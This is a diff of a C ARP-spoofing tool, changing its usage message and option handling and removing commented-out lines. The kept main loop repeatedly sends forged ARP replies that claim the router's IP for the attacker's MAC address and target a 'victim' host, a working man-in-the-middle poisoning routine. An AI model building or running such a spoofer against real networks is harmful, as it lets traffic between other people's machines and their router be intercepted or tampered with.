@@ -158,7 +158,7 @@ int main(int argc, char **argv) {
     if (argc < 2) {
         fprintf(stderr, "Too Few Arguments\n");
         fprintf(stderr, "Option -%c requires an argument.\n", optopt);
-        fprintf(stderr, "[USAGE] => %s -i \"[wlan0 or etho0]\" \n-r \"{ROUTER_IP:ROUTER_MAC}\" \n-v \"{VICTIM_IP:VICTIM_MAC}\" \n", argv[0]);
+        fprintf(stderr, "[USAGE] => %s -i \"[wlan0 or etho0]\" \n-r \"{ROUTER_IP:ROUTER_MAC}\" \n-t \"{VICTIM_IP:VICTIM_MAC}\" \n", argv[0]);
         return 1;
     } else {
         while ((c = getopt(argc, argv, "i:ur:t:")) != -1) {
@@ -191,9 +191,9 @@ int main(int argc, char **argv) {
                         fprintf(stderr, "Option -%c requires an argument.\n", optopt);
                         fprintf(stderr, "[USAGE] => %s -t {target_ip-target_mac} \n", argv[0]);
                     } else if (isprint(optopt)) {
-                        fprintf(stderr, "Unknown option `-%c'.\n", optopt);
+                        fprintf(stderr, "Unknown option '-%c'.\n", optopt);
                     } else {
-                        fprintf(stderr, "Unknown option character `\\x%x'.\n", optopt);
+                        fprintf(stderr, "Unknown option character '\\x%x'.\n", optopt);
                     }
                     return 1;
             }
@@ -266,14 +266,6 @@ int main(int argc, char **argv) {
 
 
     while (TRUE) {
-        // ethernet = create_eth_header(ROUTER_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
-        // arp = create_arp_header(MY_MAC_ADDRS, ROUTER_IP_ADDR, BROADCAST_MAC_ADDR, VICTIM_IP_ADDR, ARP_REQUEST);
-        // send_packet(ethernet, arp, interface);
-
-        // ethernet = create_eth_header(VICTIM_MAC_ADDR, ROUTER_MAC_ADDR, ETHERTYPE_ARP);
-        // arp = create_arp_header(MY_MAC_ADDRS, VICTIM_IP_ADDR, BROADCAST_MAC_ADDR, ROUTER_IP_ADDR, ARP_REQUEST);
-        // send_packet(ethernet, arp, interface);
-
         ethernet = create_eth_header(MY_MAC_ADDRS, VICTIM_MAC_ADDRS, ETHERTYPE_ARP);
         arp = create_arp_header(MY_MAC_ADDRS, ROUTER_IP_ADDRS, VICTIM_MAC_ADDRS, VICTIM_IP_ADDRS, ARP_REPLY);
         send_packet(ethernet, arp, interface);
